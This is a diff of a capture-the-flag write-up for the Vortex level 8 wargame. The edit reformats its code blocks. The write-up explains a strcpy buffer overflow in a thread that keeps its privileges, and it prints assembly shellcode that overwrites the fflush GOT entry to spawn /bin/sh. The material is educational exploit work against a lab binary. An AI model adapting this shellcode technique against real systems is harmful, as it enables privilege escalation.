@@ -22,7 +22,7 @@ It then makes syscalls to setgid & setuid to lower
 the main thread privileges back to vortex8, then calls
 the 'unsafe' function - which is just a strcpy
 
-┌────────────────── vortex8 (main) ──────────────────┐
+```c
   int main(int argc, char* argv[])
   {
       count = (undefined *)&param_1;
@@ -38,11 +38,11 @@ the 'unsafe' function - which is just a strcpy
       unsafecode(argv[1]);
       return 0;
   }
-└────────────────────────────────────────────────────┘
+```
 
 The 'safe' function
 
-┌────────── vortex8 (safecode) ──────────┐
+```c
   void safecode(void)
   {
       int32_t var_10h;
@@ -53,11 +53,11 @@ The 'safe' function
           sleep(1);
       } while( true );
   }
-└────────────────────────────────────────┘
+```
 
 And finally the 'unsafe' function
 
-┌────────── vortex8 (unsafecode) ──────────┐
+```c
   void unsafecode(char *src)
   {
       char *dest;
@@ -65,7 +65,7 @@ And finally the 'unsafe' function
       strcpy(&dest, src);
       return;
   }
-└──────────────────────────────────────────┘
+```
 
 
 Since the syscall was used to set the uid/gid, only the main thread has the lower permissions.
@@ -76,12 +76,12 @@ overwrite a function pointer (fflush or printf) to call our shellcode from the e
 
 First we write the shellcode to overwrite the fflush function pointer:
 
-┌────────────────────────────────────────────────────────────────────────────────┐
-   mov ebx, 0x0804c014  # fflush GOT location in memory
-   mov dword ptr [ebx], 0xffffdfb4 # overwrite fflush entry with shellcode addr
-   nop
-   jmp -1                # jmp back for infinite loop          
-└────────────────────────────────────────────────────────────────────────────────┘
+```nasm
+mov ebx, 0x0804c014  ; fflush GOT location in memory
+mov dword ptr [ebx], 0xffffdfb4 ; overwrite fflush entry with shellcode addr
+nop
+jmp -1                ; jmp back for infinite loop          
+```
 
 This shellcode overwrites the GOT with the location of our shellcode to exec /bin/sh.
 It also causes an infinite loop (nop->jmp -1) in order to keep the unprivileged thread
